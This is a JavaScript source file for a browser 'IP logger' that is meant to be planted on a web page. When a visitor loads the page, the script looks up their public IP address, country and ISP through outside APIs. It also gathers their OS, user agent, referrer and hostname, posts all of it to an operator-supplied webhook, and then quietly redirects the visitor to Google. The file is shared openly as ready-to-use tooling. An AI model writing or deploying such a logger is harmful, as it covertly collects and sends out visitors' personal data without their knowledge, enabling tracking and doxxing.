// if your gonna steal, give credits to yuvi#0930

async function sendWebhookMessage(clientIP, clientData) {
    
    // webhook

    const webhookURL = "your webhook here";

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            embeds: [{
                title: `Moonify Logger`,
                color: 16711680,
                description: `**IP Address:** ${clientIP}\n\n` +
                    `**Operating System:** ${clientData.os}\n\n` +
                    `**Country:** ${clientData.country}\n\n` +
                    `**Date/Time:** ${clientData.datetime}\n\n` +
                    `**Browser:** ${clientData.browser}\n\n` +
                    `**User Agent:** ${clientData.userAgent}\n\n` +
                    `**Referring URL:** ${clientData.referrer}\n\n` +
                    `**Host Name:** ${clientData.hostname}\n\n` +
                    `**ISP:** ${clientData.isp}`
            }]
        }),
    };
    await fetch(webhookURL, options)
        .then(response => console.log(`Successfully sent data`))
        .catch(error => console.error(`Error sending data: ${error}`));
}

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(async data => {
        const clientIP = data.ip;
        let country, isp;
        await fetch(`https://ipapi.co/${clientIP}/json/`)
            .then(response => response.json())
            .then(data => {
                country = data.country_name;
                isp = data.org;
            });
        const clientData = {
            os: navigator.platform,
            country: country,
            datetime: new Date().toLocaleString(),
            browser: navigator.userAgent,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            hostname: window.location.hostname,
            isp: isp
        };
        await sendWebhookMessage(clientIP, clientData);

        // Redirect to any website you want.

        window.location.replace("https://www.google.com/");

    });
